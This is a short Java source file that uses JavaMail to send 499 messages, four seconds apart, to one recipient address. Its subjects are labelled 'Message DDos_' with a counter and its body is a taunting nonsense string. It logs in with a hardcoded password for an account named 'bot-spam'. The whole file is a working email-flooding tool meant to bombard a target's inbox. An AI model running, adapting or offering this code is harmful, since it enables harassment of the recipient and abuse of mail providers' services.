import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class Sending {

    public void SendingMessage(String to,String from,Properties props) throws MessagingException, InterruptedException
    {
        for (int i = 1; i < 500; i++)
        {
            props.put("mail.smtp.auth", "true");
            Session defSession = Session.getDefaultInstance(props, new MyAuthenticator());
            defSession.setDebug(true);
            Message message = new MimeMessage(defSession);
            message.setSubject("Message DDos_" + i);
            message.setFrom(new InternetAddress(from));
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
            message.setContent("Ya RoDiLsY !!1!!11!1odin1!", "text/plain");
            Transport.send(message, message.getRecipients(Message.RecipientType.TO));
            //System.out.wait(0,4000);
            Thread.sleep(4000);
        }
    }

    private class MyAuthenticator extends Authenticator
    {
        protected PasswordAuthentication getPasswordAuthentication()
        {
            return new PasswordAuthentication("bot-spam@rambler.ru", "12345678qwerty");
        }
    }
}
